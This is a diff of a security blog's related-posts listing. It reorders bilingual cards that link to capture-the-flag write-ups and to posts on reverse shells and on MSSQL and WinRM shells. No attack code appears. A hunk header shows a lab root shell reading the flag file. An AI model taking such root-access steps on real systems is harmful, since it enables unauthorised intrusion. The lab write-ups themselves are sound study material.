-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
-      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Oct 2016</time>
-      <time lang="el">17 Οκτ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
     <div class="cell">
       <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
@@ -1778,102 +1883,6 @@ root@unattended:~# cat /root/root.txt
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Jul 2016</time>
-      <time lang="el">21 Ιουλ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
           
            
            
@@ -1915,16 +1924,16 @@ root@unattended:~# cat /root/root.txt
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1943,6 +1952,8 @@ root@unattended:~# cat /root/root.txt
            
            
           
+          
+           
            
            
            
@@ -1950,21 +1961,218 @@ root@unattended:~# cat /root/root.txt
            
            
            
+           
           
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1974,11 +2182,6 @@ root@unattended:~# cat /root/root.txt
            
            
            
-          
-          
-           
-           
-           
            
           
            
@@ -2045,110 +2248,21 @@ root@unattended:~# cat /root/root.txt
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2255,27 +2369,6 @@ root@unattended:~# cat /root/root.txt
            
            
            
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -2518,26 +2611,31 @@ root@unattended:~# cat /root/root.txt
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
            
           
            
            
            
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2729,112 +2827,6 @@ root@unattended:~# cat /root/root.txt
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
         </div>
